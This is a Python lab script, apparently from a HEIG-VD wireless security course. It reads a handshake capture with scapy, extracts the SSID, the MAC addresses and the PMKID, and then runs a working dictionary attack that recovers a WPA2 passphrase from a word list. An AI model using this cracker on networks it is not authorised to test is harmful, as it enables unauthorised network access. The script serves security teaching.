#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Derive WPA keys from Passphrase and 4-way handshake info

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

__author__      = "Abraham Rubinstein et Yann Lederrey"
__copyright__   = "Copyright 2017, HEIG-VD"
__license__ 	= "GPL"
__version__ 	= "1.0"
__email__ 		= "abraham.rubinstein@heig-vd.ch"
__status__ 		= "Prototype"

from scapy.all import *
from binascii import a2b_hex, b2a_hex, hexlify
from pbkdf2 import *
from pbkdf2_math import pbkdf2_hex
from numpy import array_split
from numpy import array
import hmac, hashlib


# Read capture file -- it contains beacon, authentication, associacion, handshake and data
wpa=rdpcap("PMKID_handshake.pcap") 

# Important parameters for key derivation - most of them can be obtained from the pcap file
passPhrase  = "admin123"
A           = "Pairwise key expansion" #this string is used in the pseudo-random function



# Récupération des valeurs pouvant être trouvée dans la capture
# le ssid peut être récupéré dans le premier paquet de la capture

# Get SSID from a near beacon
ssid = wpa[144].info
# Get AP mac address from the first packet of 4-way handshake
APmac = a2b_hex(wpa[145].addr2.replace(":","").lower()) 
# Get Client mac address from the first packet of 4-way handshake
Clientmac = a2b_hex(wpa[145].addr1.replace(":","").lower())  
# Get PMKID from the first packet of 4-way handshake
PmkidToTest= hexlify(wpa[145].load)[202:234]
pmkName = "PMK Name".encode()

#Boolean to know if passphrase is found or not
foundPassphrase = False

with open('dico.txt') as f:
    for passPhrase in f:
        if(passPhrase[-1] == '\n'):
            passPhrase = passPhrase[:-1]
        
        # calculate 4096 rounds to obtain the 256 bit (32 oct) PMK
        pmk = pbkdf2(hashlib.sha1, passPhrase.encode(), ssid, 4096, 32)
       
       
        pmkid = str.encode(hmac.new(pmk, pmkName + APmac + Clientmac, hashlib.sha1).hexdigest()[:32])


        # if the computed MIC matches the given MIC, we're done, otherwise, we loop again
        if (PmkidToTest == pmkid):
            foundPassphrase=True
            
            print ("\n\npassPhrase found, value : ", passPhrase , "\n")
            print ("Values used to derivate keys")
            print ("============================")
            print ("Passphrase: \t",passPhrase ,"\n")
            print ("SSID: \t\t", ssid.decode() ,"\n")
            print ("AP Mac: \t",b2a_hex(APmac).decode() ,"\n")
            print ("CLient Mac: \t",b2a_hex(Clientmac).decode() ,"\n")
        
            print ("\nResults of the key expansion")
            print ("=============================")

            print ("PMK:\t\t",pmk.hex() ,"\n")
            print ("PMKID:\t\t", pmkid ,"\n")
            print ("PMKID_to_test:\t", PmkidToTest ,"\n")
        
if(foundPassphrase == False):
    print ("\npassPhrase not found in dico\n")



